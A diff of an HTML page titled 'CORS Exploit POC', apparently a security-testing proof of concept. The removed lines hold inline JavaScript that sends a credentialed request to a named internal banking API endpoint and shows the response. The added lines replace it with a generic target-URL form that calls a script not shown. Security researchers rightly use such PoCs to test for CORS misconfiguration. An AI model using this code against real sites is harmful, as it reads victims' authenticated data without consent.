@@ -1,23 +1,25 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS POC Exploit</title>
+    <link rel="icon" href="CORS ICON.png" type="image/png">
+    <link rel="stylesheet" href="style.css">
+</head>
 <body>
-<center>
-<h2>CORS POC Exploit</h2>
-<h3>Extract SID</h3>
-<div id="demo">
-<button type="button" onclick="cors()">Exploit</button>
-</div>
-<script>
-function cors(){
-var xhttp= new XMLHttpRequest();
-xhttp.onreadystatechange=function(){
-if(this.readyState== 4 && this.status== 200) {
-document.getElementById("demo").innerHTML = alert(this.responseText);
-}
-};
-xhttp.open("GET", "https://internal-api.monzo.com/inbound-p2p/username/paulsmith6", true);
-xhttp.withCredentials=true;
-xhttp.send();
-}
-</script>
+    <div class="container">
+        <h2 data-text="CORS Exploit POC">CORS Exploit POC</h2>
+        <hr><br>
+        <div class="input-container">
+            <input type="text" id="targetURL" placeholder="Enter the target vulnerable URL here" />
+            <button onclick="exploitCORS()">Exploit</button>
+        </div>
+        <textarea id="fetchedResource" placeholder="Click the button to fetch the resource!"></textarea>
+    </div>
+    <footer>
+    <p>Created By <a href="https://github.com/Milan-Gautam" target="_blank" rel="noopener noreferrer">Milan</a> | Designed with ❤️</p>
+    </footer>
+    <script src="script.js"></script>
 </body>
 </html>
